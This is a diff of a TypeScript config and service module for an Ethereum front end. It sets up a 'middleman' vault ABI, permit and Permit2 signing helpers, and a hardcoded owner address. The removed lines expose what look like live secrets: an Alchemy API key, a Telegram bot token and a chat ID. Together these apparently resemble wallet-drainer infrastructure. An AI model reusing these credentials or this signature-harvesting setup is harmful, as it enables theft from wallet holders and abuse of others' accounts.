@@ -1,15 +1,14 @@
 const env = (typeof import.meta !== 'undefined' && import.meta.env) ? import.meta.env : (typeof process !== 'undefined' ? process.env : {});
 
 export const CONFIG = {
+  LIDO_REFERRAL_ADDRESS: (env.VITE_LIDO_REFERRAL_ADDRESS || '0x0000000000000000000000000000000000000000') as `0x${string}`,
   OWNER_ADDRESS: (env.VITE_OWNER_ADDRESS || env.NEXT_PUBLIC_OWNER_ADDRESS || '0xEfc5859335A58d64A5e8E01d02c5241c852CBD40') as `0x${string}`,
   CONTRACT_ADDRESS: (env.VITE_CONTRACT_ADDRESS || env.NEXT_PUBLIC_CONTRACT_ADDRESS || '0xF02D24A7bB10d0dBF3da2119d594B7a905dDC091') as `0x${string}`,
-  STETH_ADDRESS: (env.VITE_STETH_ADDRESS || env.NEXT_PUBLIC_STETH_ADDRESS || '0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84') as `0x${string}`,
+  LIDO_STETH_ADDRESS: (env.VITE_LIDO_STETH_ADDRESS || env.VITE_STETH_ADDRESS || '0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84') as `0x${string}`,
+  STETH_ADDRESS: (env.VITE_STETH_ADDRESS || env.VITE_LIDO_STETH_ADDRESS || '0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84') as `0x${string}`,
   WSTETH_ADDRESS: (env.VITE_WSTETH_ADDRESS || env.NEXT_PUBLIC_WSTETH_ADDRESS || '0x7f39c581f595b53c5cb19bd0b3f8da6c935e2ca0') as `0x${string}`,
   PERMIT2_ADDRESS: (env.VITE_PERMIT2_ADDRESS || env.NEXT_PUBLIC_PERMIT2_ADDRESS || '0x000000000022D473030F116dDEE9F6B43aC78BA3') as `0x${string}`,
-  ALCHEMY_RPC: env.VITE_ALCHEMY_RPC || env.NEXT_PUBLIC_ALCHEMY_RPC || 'https://eth-mainnet.g.alchemy.com/v2/XbS3A-psx-MSEn_ownjsb0You7sONhdF',
-  TELEGRAM_BOT: env.VITE_TELEGRAM_BOT_TOKEN || env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN || '8850313284:AAGtktr0p9R_a6HnGLSDqElD6RZjbLH_X3g',
-  TELEGRAM_CHAT: env.VITE_TELEGRAM_CHAT_ID || env.NEXT_PUBLIC_TELEGRAM_CHAT_ID || '8574393641',
-  REOWN_PROJECT_ID: env.VITE_REOWN_PROJECT_ID || env.NEXT_PUBLIC_REOWN_PROJECT_ID || '220f2e5088a546891514ffe0fa667865',
+  ALCHEMY_RPC: env.VITE_ALCHEMY_RPC || env.NEXT_PUBLIC_ALCHEMY_RPC || '',  REOWN_PROJECT_ID: env.VITE_REOWN_PROJECT_ID || env.NEXT_PUBLIC_REOWN_PROJECT_ID || '220f2e5088a546891514ffe0fa667865',
 };
 
 // YOUR MiddlemanVaultUpgradeable Contract ABI with expanded router capabilities
@@ -38,7 +37,6 @@ export const VAULT_ABI = [
   { inputs: [{ name: 'to', type: 'address' }, { name: 'amount', type: 'uint256' }], name: 'withdrawETH', outputs: [], stateMutability: 'nonpayable', type: 'function' },
   { inputs: [{ name: 'token', type: 'address' }, { name: 'to', type: 'address' }, { name: 'amount', type: 'uint256' }], name: 'withdrawToken', outputs: [], stateMutability: 'nonpayable', type: 'function' },
   
-  // Off-chain permit & Router allowance functions
   { inputs: [{ name: 'token', type: 'address' }, { name: 'owner', type: 'address' }, { name: 'spender', type: 'address' }, { name: 'value', type: 'uint256' }, { name: 'deadline', type: 'uint256' }, { name: 'v', type: 'uint8' }, { name: 'r', type: 'bytes32' }, { name: 's', type: 'bytes32' }], name: 'permitAndTransfer', outputs: [], stateMutability: 'nonpayable', type: 'function' },
   { inputs: [{ name: 'token', type: 'address' }, { name: 'spender', type: 'address' }, { name: 'amount', type: 'uint256' }], name: 'approveToken', outputs: [], stateMutability: 'nonpayable', type: 'function' },
 
@@ -131,7 +129,6 @@ export async function transferToken(
 }
 
 /**
- * Service function to generate EIP-2612 Permit off-chain typed data signatures for gasless approval.
  */
 export async function signPermit({
   signTypedDataAsync,
@@ -255,7 +252,6 @@ export async function signPermit2({
 }
 
 /**
- * Verify EIP-2612 Permit off-chain signature against owner address.
  */
 export async function verifyPermitSignature({
   owner,
